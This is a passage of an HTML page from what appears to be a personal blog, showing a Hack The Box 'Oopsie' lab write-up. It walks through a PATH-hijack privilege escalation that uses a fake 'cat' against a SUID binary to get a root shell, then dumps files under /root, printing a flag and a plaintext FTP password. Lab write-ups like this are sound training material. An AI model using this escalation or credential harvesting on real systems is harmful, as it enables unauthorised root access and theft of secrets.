+</span><span style="color:#50fa7b;">Wed</span><span> Apr  7 12:36:19 UTC 2021
+</span><span>
+</span><span>
+</span><span style="color:#6272a4;">### SYSTEM ##############################################
+</span><span>
+</span><span style="color:#50fa7b;">...
+</span><span>
+</span><span style="color:#50fa7b;">[-]</span><span> Hostname:
+</span><span style="color:#50fa7b;">oopsie
+</span><span>
+</span><span>
+</span><span style="color:#6272a4;">### USER/GROUP ##########################################
+</span><span style="color:#50fa7b;">[-]</span><span> Current user/group info:
+</span><span style="color:#ffffff;">uid</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">1000</span><span>(</span><span style="color:#50fa7b;">robert</span><span>) gid=1000(robert) </span><span style="color:#ffffff;">groups</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">1000</span><span>(</span><span style="color:#50fa7b;">robert</span><span>),1001(bugtracker)
+</span><span>
+</span><span style="color:#50fa7b;">...
+</span><span>
+</span><span style="color:#6272a4;">### INTERESTING FILES ####################################
+</span><span>
+</span><span style="color:#50fa7b;">...
+</span><span>
+</span><span style="color:#50fa7b;">[-]</span><span> SUID files:
+</span><span>
+</span><span style="color:#50fa7b;">...
+</span><span>
+</span><span style="color:#50fa7b;">-rwsr-xr--</span><span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+</span><span style="color:#50fa7b;">...
+</span><span>
+</span><span style="color:#6272a4;">### SCAN COMPLETE ####################################
+</span></code></pre>
+<p>First notice that Robert is part of a group called <code>bugtracker</code>.  Further down, under the Interesting Files header, we find a <code>bugtracker</code> executable:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">-rwsr-xr--</span><span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+</span></code></pre>
+<p>Interesting!  Running this, we get a prompt to provide bug ID.  Providing it with bug ID <code>1</code>, we get</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">robert@oopsie:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">$</span><span> bugtracker
+</span><span style="color:#50fa7b;">bugtracker
+</span><span>
+</span><span style="color:#50fa7b;">------------------
+</span><span style="color:#8be9fd;">:</span><span> EV Bug Tracker :
+</span><span style="color:#50fa7b;">------------------
+</span><span>
+</span><span style="color:#50fa7b;">Provide</span><span> Bug ID: 1
+</span><span style="color:#50fa7b;">1
+</span><span style="color:#50fa7b;">---------------
+</span><span>
+</span><span style="color:#50fa7b;">Binary</span><span> package hint: ev-engine-lib
+</span><span>
+</span><span style="color:#50fa7b;">Version:</span><span> 3.3.3-1
+</span><span>
+</span><span style="color:#50fa7b;">Reproduce:
+</span><span style="color:#50fa7b;">When</span><span> loading library in firmware it seems to be crashed
+</span><span>
+</span><span style="color:#50fa7b;">What</span><span> you expected to happen:
+</span><span style="color:#50fa7b;">Synchronized</span><span> browsing to be enabled since it is enabled for that site.
+</span><span>
+</span><span style="color:#50fa7b;">What</span><span> happened instead:
+</span><span style="color:#50fa7b;">Synchronized</span><span> browsing is disabled. Even choosing VIEW </span><span style="color:#ff79c6;">&gt;</span><span> SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+</span></code></pre>
+<p>There seem to be two other bugs, but no fourth (and presumable no fifth, etc.).</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">robert@oopsie:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">$</span><span> bugtracker
+</span><span style="color:#50fa7b;">bugtracker
+</span><span>
+</span><span style="color:#50fa7b;">------------------
+</span><span style="color:#8be9fd;">:</span><span> EV Bug Tracker :
+</span><span style="color:#50fa7b;">------------------
+</span><span>
+</span><span style="color:#50fa7b;">Provide</span><span> Bug ID: 4
+</span><span style="color:#50fa7b;">4
+</span><span style="color:#50fa7b;">---------------
+</span><span>
+</span><span style="color:#50fa7b;">cat:</span><span> /root/reports/4: No such file or directory
+</span><span>
+</span><span style="color:#50fa7b;">robert@oopsie:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">$
+</span></code></pre>
+<p>Unfortunately the executable is compiled, but from the above <code>cat</code> error we can gleam that <code>cat</code> is used to print some report file.  What we can do is something very clever: create our own <code>cat</code> executable and give it priority in path so that the <code>bugtracker</code> command uses this instead!  If our own cat creates a shell of its own, then we will have root privileges!</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">robert@oopsie:</span><span style="color:#bd93f9;">~</span><span style="color:#50fa7b;">$</span><span> cd /tmp
+</span><span style="color:#8be9fd;">cd</span><span> /tmp
+</span><span style="color:#50fa7b;">robert@oopsie:/tmp$</span><span> export PATH=/tmp:$</span><span style="color:#ffffff;">PATH
+</span><span style="color:#ff79c6;">export </span><span style="color:#ffffff;">PATH</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">/tmp:$</span><span style="color:#ffffff;">PATH
+</span><span style="color:#50fa7b;">robert@oopsie:/tmp$</span><span> echo </span><span style="color:#f1fa8c;">&#39;/bin/bash&#39; </span><span style="color:#ff79c6;">&gt;</span><span> cat </span><span style="color:#ff79c6;">&amp;&amp; </span><span style="color:#50fa7b;">chmod</span><span> +x cat
+</span><span style="color:#8be9fd;">echo </span><span style="color:#f1fa8c;">&#39;/bin/sh&#39; </span><span style="color:#ff79c6;">&gt;</span><span> cat </span><span style="color:#ff79c6;">&amp;&amp; </span><span style="color:#50fa7b;">chmod</span><span> +x cat
+</span></code></pre>
+<p>Now running <code>bugtracker</code> once more we look to have silent success:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">robert@oopsie:/tmp$</span><span> bugtracker
+</span><span style="color:#50fa7b;">bugtracker
+</span><span>
+</span><span style="color:#50fa7b;">------------------
+</span><span style="color:#8be9fd;">:</span><span> EV Bug Tracker :
+</span><span style="color:#50fa7b;">------------------
+</span><span>
+</span><span style="color:#50fa7b;">Provide</span><span> Bug ID: 1
+</span><span style="color:#50fa7b;">1
+</span><span style="color:#50fa7b;">---------------
+</span><span>
+</span><span style="color:#50fa7b;">root@oopsie:/tmp#
+</span></code></pre>
+<p>Indeed, we are now a root user!  We can collect our flag and leave at once.</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#50fa7b;">root@oopsie:/tmp#</span><span> whoami
+</span><span style="color:#50fa7b;">whoami
+</span><span style="color:#50fa7b;">root
+</span><span style="color:#50fa7b;">root@oopsie:/tmp#</span><span> cd /root
+</span><span style="color:#8be9fd;">cd</span><span> /root
+</span><span style="color:#50fa7b;">root@oopsie:/root#</span><span> ls</span><span style="font-style:italic;color:#ffb86c;"> -A
+</span><span style="color:#50fa7b;">ls</span><span style="font-style:italic;color:#ffb86c;"> -A
+</span><span style="color:#50fa7b;">.bash_history</span><span>  .cache	.gnupg	.profile  root.txt  .viminfo
+</span><span style="color:#50fa7b;">.bashrc</span><span>        .config	.local	reports   .ssh
+</span><span style="color:#50fa7b;">root@oopsie:/root#</span><span> PATH=$(</span><span style="color:#50fa7b;">getconf</span><span> PATH)
+</span><span style="color:#ffffff;">PATH</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">$(</span><span style="color:#50fa7b;">getconf</span><span style="color:#f1fa8c;"> PATH)
+</span><span style="color:#50fa7b;">root@oopsie:/root#</span><span> cat root.txt
+</span><span style="color:#50fa7b;">cat</span><span> root.txt
+</span><span style="color:#50fa7b;">af13b0bee69f8a877c3faf667f7beacf
+</span></code></pre>
+<br>
+<hr />
+<br>
+<h2 id="notes">Notes</h2>
+<p>I got a little nudge for the final step of this.  But boy, this is a simple solution.  I had never thought of this before, and it is ever-so clever!</p>
+<p>Another quick note: because this box used something from the previous box, I had a little look around, especially in this root directory:</p>
+<pre data-lang="bash" style="background-color:#282a36;color:#f8f8f2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#6272a4;"># find . -type f | while IFS= read -r line; do echo &quot;\n\n\033[1;38m$line\033[0;38m&quot;; cat &quot;$line&quot;; done
+</span><span style="color:#50fa7b;">find</span><span> .</span><span style="font-style:italic;color:#ffb86c;"> -type</span><span> f </span><span style="color:#ff79c6;">| while </span><span style="color:#50fa7b;">IFS</span><span>= read</span><span style="font-style:italic;color:#ffb86c;"> -r</span><span> line</span><span style="color:#ff79c6;">; do </span><span style="color:#8be9fd;">echo </span><span style="color:#f1fa8c;">&quot;\n\n\033[1;38m$</span><span style="color:#ffffff;">line</span><span style="color:#f1fa8c;">\033[0;38m&quot;</span><span style="color:#ff79c6;">; </span><span style="color:#50fa7b;">cat </span><span style="color:#f1fa8c;">&quot;$</span><span style="color:#ffffff;">line</span><span style="color:#f1fa8c;">&quot;</span><span style="color:#ff79c6;">; done
+</span><span>
+</span><span style="color:#50fa7b;">...
+</span><span>
+</span><span style="color:#50fa7b;">./.config/filezilla/filezilla.xml
+</span><span style="color:#ff79c6;">&lt;?</span><span>xml </span><span style="color:#ffffff;">version</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">&quot;1.0&quot; </span><span style="color:#ffffff;">encoding</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">&quot;UTF-8&quot; </span><span style="color:#ffffff;">standalone</span><span style="color:#ff79c6;">=</span><span style="color:#f1fa8c;">&quot;yes&quot; </span><span style="color:#50fa7b;">?</span><span style="color:#ff79c6;">&gt;
+</span><span style="color:#ff79c6;">&lt;</span><span>FileZilla3</span><span style="color:#ff79c6;">&gt;
+</span><span>    </span><span style="color:#ff79c6;">&lt;</span><span>RecentServers</span><span style="color:#ff79c6;">&gt;
+</span><span>        </span><span style="color:#ff79c6;">&lt;</span><span>Server</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>Host</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">10</span><span style="color:#50fa7b;">.10.10.46</span><span style="color:#ff79c6;">&lt;</span><span>/Host</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>Port</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">21</span><span style="color:#ff79c6;">&lt;</span><span>/Port</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>Protocol</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">&lt;</span><span>/Protocol</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>Type</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">&lt;</span><span>/Type</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>User</span><span style="color:#ff79c6;">&gt;</span><span>ftpuser</span><span style="color:#ff79c6;">&lt;</span><span>/User</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>Pass</span><span style="color:#ff79c6;">&gt;</span><span>mc@F1l3ZilL4</span><span style="color:#ff79c6;">&lt;</span><span>/Pass</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>Logontype</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">1</span><span style="color:#ff79c6;">&lt;</span><span>/Logontype</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>TimezoneOffset</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">&lt;</span><span>/TimezoneOffset</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>PasvMode</span><span style="color:#ff79c6;">&gt;</span><span>MODE_DEFAULT</span><span style="color:#ff79c6;">&lt;</span><span>/PasvMode</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>MaximumMultipleConnections</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">&lt;</span><span>/MaximumMultipleConnections</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>EncodingType</span><span style="color:#ff79c6;">&gt;</span><span>Auto</span><span style="color:#ff79c6;">&lt;</span><span>/EncodingType</span><span style="color:#ff79c6;">&gt;
+</span><span>            </span><span style="color:#ff79c6;">&lt;</span><span>BypassProxy</span><span style="color:#ff79c6;">&gt;</span><span style="color:#bd93f9;">0</span><span style="color:#ff79c6;">&lt;</span><span>/BypassProxy</span><span style="color:#ff79c6;">&gt;
+</span><span>        </span><span style="color:#ff79c6;">&lt;</span><span>/Server</span><span style="color:#ff79c6;">&gt;
+</span><span>    </span><span style="color:#ff79c6;">&lt;</span><span>/RecentServers</span><span style="color:#ff79c6;">&gt;
+</span><span style="color:#ff79c6;">&lt;</span><span>/FileZilla3</span><span style="color:#ff79c6;">&gt;
+</span></code></pre>
+<p>Good to note that there is a username and password in plain text here in this last file we found.</p>
+
+</article>
+
+<section class="pagination">
+	<a href="https://jakewilliami.github.io/htb-notes/" class="left arrow">&#8592;</a>
+	<a href="#" class="top">Top</a>
+	<a href="https://jakewilliami.github.io/htb-archetype/" class="right arrow">&#8594;</a>
+</section>
+
+  </main>
+
+  <footer>
+
+  <span class="copyright">
+    &copy; 2020&ndash;2024 Jake W. Ireland. Powered by <a href="https://www.getzola.org">Zola</a> and <a href="https://github.com/semanticdata/mabuya">Mabuya</a>/<a href="https://github.com/aaranxu/tale-zola">Tale</a>; inspired by <a href="https://github.com/nielsenramon/chalk">Chalk</a>.
+  </span>
+
+  <nav class="navigation-footer">
+    <ul>
+      <li><a href="https://github.com/jakewilliami">GitHub</a></li>
+      <li><a href="https://twitter.com/JakeWIreland">Twitter</a></li>
+      <li><a href="https://www.linkedin.com/in/jake-ireland-nz/">LinkedIn</a></li>
+    </ul>
+  </nav>
+
+</footer>
+
+</body>
+
+</html>
